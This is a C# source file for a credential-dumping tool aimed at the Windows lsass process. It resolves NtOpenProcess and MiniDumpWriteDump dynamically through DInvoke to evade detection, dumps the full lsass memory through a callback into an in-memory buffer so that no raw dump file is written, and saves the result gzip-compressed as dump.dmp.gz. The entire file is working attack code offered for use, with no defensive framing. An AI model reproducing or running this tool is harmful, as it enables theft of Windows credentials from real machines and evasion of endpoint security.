using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using DInvoke.DynamicInvoke;

namespace DMiniDumpWrite
{
    class Program
    {
        // --- FIXED BUFFER ---
        static byte[] dumpBuffer = new byte[200 * 1024 * 1024]; // 200 MB fixed
        static int bufferSize = 0;

        // --- CALLBACK STRUCTS ---
        public enum MINIDUMP_CALLBACK_TYPE
        {
            ModuleCallback,
            ThreadCallback,
            ThreadExCallback,
            IncludeThreadCallback,
            IncludeModuleCallback,
            MemoryCallback,
            CancelCallback,
            WriteKernelMinidumpCallback,
            KernelMinidumpStatusCallback,
            RemoveMemoryCallback,
            IncludeVmRegionCallback,
            IoStartCallback,
            IoWriteAllCallback,
            IoFinishCallback,
            ReadMemoryFailureCallback,
            SecondaryFlagsCallback,
            IsProcessSnapshotCallback,
            VmStartCallback,
            VmQueryCallback,
            VmPreReadCallback,
            VmPostReadCallback
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct MINIDUMP_IO_CALLBACK
        {
            public IntPtr Handle;
            public ulong Offset;
            public IntPtr Buffer;
            public int BufferBytes;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct MINIDUMP_CALLBACK_INPUT
        {
            public int ProcessId;
            public IntPtr ProcessHandle;
            public MINIDUMP_CALLBACK_TYPE CallbackType;
            public MINIDUMP_IO_CALLBACK Io;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MINIDUMP_CALLBACK_OUTPUT
        {
            public uint status;
        }

        public struct MINIDUMP_CALLBACK_INFORMATION
        {
            public IntPtr CallbackRoutine;
            public IntPtr CallbackParam;
        }

        public delegate bool CallBack(
            int CallbackParam,
            IntPtr PointerCallbackInput,
            IntPtr PointerCallbackOutput
        );

        // --- IMPORTS ---
        //NtOpenProcess
        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct IO_STATUS_BLOCK
        {
            public uint Status;
            public IntPtr Information;
        }

        

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtOpenProcessDelegate(
            ref IntPtr ProcessHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID ClientId);

        public const uint PROCESS_QUERY_INFORMATION = 0x0400;
        public const uint PROCESS_VM_READ = 0x0010;

        //NtOpenProcess end

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        delegate bool MiniDumpWriteDumpDelegate(
            IntPtr hProcess,
            uint ProcessId,
            IntPtr hFile,
            int DumpType,
            IntPtr ExceptionParam,
            IntPtr UserStreamParam,
            IntPtr CallbackParam);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool NtCloseHandleDelegate(IntPtr hObject);

        static CallBack PersistentCallback; // evita GC
        static IntPtr mci_pointer = IntPtr.Zero;

        static void Main()
        {
            try
            {
                string processName = "lsass";
                        

            Process[] processes = Process.GetProcessesByName(processName);
            if (processes.Length == 0)
            {
                Console.WriteLine("[-] Process {0} not found.", processName);
                return;
            }

            Process hProcess = processes[0];
            Console.WriteLine("[+]Process {0} found with PID: {1}.", processName, hProcess.Id);

            int PID = hProcess.Id;

            IntPtr ntOpenPro = Generic.GetLibraryAddress("ntdll.dll", "NtOpenProcess", true);
            IntPtr dbghelpHandle = Generic.GetLibraryAddress("dbgcore.dll", "MiniDumpWriteDump", true);
            IntPtr ntclHandle = Generic.GetLibraryAddress("ntdll.dll", "NtClose", true);

            var ntOpenProcess = (NtOpenProcessDelegate)Marshal.GetDelegateForFunctionPointer(ntOpenPro, typeof(NtOpenProcessDelegate));
            var miniDumpWriteDump = (MiniDumpWriteDumpDelegate)Marshal.GetDelegateForFunctionPointer(dbghelpHandle, typeof(MiniDumpWriteDumpDelegate));
            var closeHandle = (NtCloseHandleDelegate)Marshal.GetDelegateForFunctionPointer(ntclHandle, typeof(NtCloseHandleDelegate));

            

            CLIENT_ID clientId = new CLIENT_ID
            {
                UniqueProcess = (IntPtr)PID,
                UniqueThread = IntPtr.Zero
            };

            OBJECT_ATTRIBUTES objectAttributesProcess = new OBJECT_ATTRIBUTES
            {
                Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                ObjectName = IntPtr.Zero,
                Attributes = 0,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = IntPtr.Zero
            };

            IntPtr processHandle = IntPtr.Zero;

            int statusProcess = ntOpenProcess(
                ref processHandle,
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                ref objectAttributesProcess,
                ref clientId
            );

            if (statusProcess != 0 || processHandle == IntPtr.Zero)
            {
                Console.WriteLine("[-]Failing getting NtOpenProcess process handle.");
                return;
            }

                // --- Callback  ---
                PersistentCallback = new CallBack(CallBackFunction);
                MINIDUMP_CALLBACK_INFORMATION mci;
                mci.CallbackRoutine = Marshal.GetFunctionPointerForDelegate(PersistentCallback);
                mci.CallbackParam = IntPtr.Zero;
                mci_pointer = Marshal.AllocHGlobal(Marshal.SizeOf(mci));
                Marshal.StructureToPtr(mci, mci_pointer, true);

                // --- calling MiniDumpWriteDump ---
                //dumpType = 2 MiniDumpWithFullMemory
                bool result = miniDumpWriteDump(
                    processHandle,
                    (uint)PID,
                    IntPtr.Zero,
                    2,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    mci_pointer
                );

                if (result)
                {
                    Console.WriteLine("[+] Memory dumped, size: " + bufferSize);

                    // --- Compress buffer ---
                    using (MemoryStream ms = new MemoryStream())
                    {
                        ms.Write(dumpBuffer, 0, bufferSize);
                        ms.Position = 0;

                        using (FileStream compressedFile = new FileStream("dump.dmp.gz", FileMode.Create))
                        using (GZipStream gzip = new GZipStream(compressedFile, CompressionMode.Compress))
                        {
                            ms.CopyTo(gzip);
                        }
                    }
                    Console.WriteLine("[+] Compressed dump.dmp.gz created.");
                }
                else
                {
                    Console.WriteLine("[-] Error dumping memory. GetLastError: " + Marshal.GetLastWin32Error());
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Exception during dump: " + ex);
            }
            finally
            {
                // --- clean and free memory ---
                if (mci_pointer != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(mci_pointer);
                    mci_pointer = IntPtr.Zero;
                }
                Array.Clear(dumpBuffer, 0, bufferSize);
                bufferSize = 0;
                GC.KeepAlive(PersistentCallback);
            }
        }

        static bool CallBackFunction(int CallbackParam, IntPtr PointerCallbackInput, IntPtr PointerCallbackOutput)
        {
            try
            {
                var callbackInput = Marshal.PtrToStructure<MINIDUMP_CALLBACK_INPUT>(PointerCallbackInput);
                var callbackOutput = new MINIDUMP_CALLBACK_OUTPUT();

                switch (callbackInput.CallbackType)
                {
                    case MINIDUMP_CALLBACK_TYPE.IoStartCallback:
                        callbackOutput.status = 0x1;
                        Console.WriteLine("[+] Start Dumping");
                        //Console.WriteLine("[CB] IoStartCallback invoked");
                        break;

                    case MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback:
                        if (callbackInput.Io.Buffer != IntPtr.Zero && callbackInput.Io.BufferBytes > 0)
                        {
                            // fixed buffer, only cast int is secure
                            int requiredSize = (int)(callbackInput.Io.Offset + (ulong)callbackInput.Io.BufferBytes);
                            Marshal.Copy(callbackInput.Io.Buffer, dumpBuffer, (int)callbackInput.Io.Offset, callbackInput.Io.BufferBytes);
                            bufferSize = Math.Max(bufferSize, requiredSize);
                            //Console.WriteLine($"[CB] IoWriteAllCallback: Offset={callbackInput.Io.Offset}, Bytes={callbackInput.Io.BufferBytes}"); 
                        }
                        callbackOutput.status = 0;
                        break;

                    case MINIDUMP_CALLBACK_TYPE.IoFinishCallback:
                        callbackOutput.status = 0;
                        Console.WriteLine("[+] Finish Dumping");
                        //Console.WriteLine("[CB] IoFinishCallback invoked");
                        break;
                }

                Marshal.StructureToPtr(callbackOutput, PointerCallbackOutput, true);
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Exception in callback: " + ex);
                return false;
            }
        }
    }
}
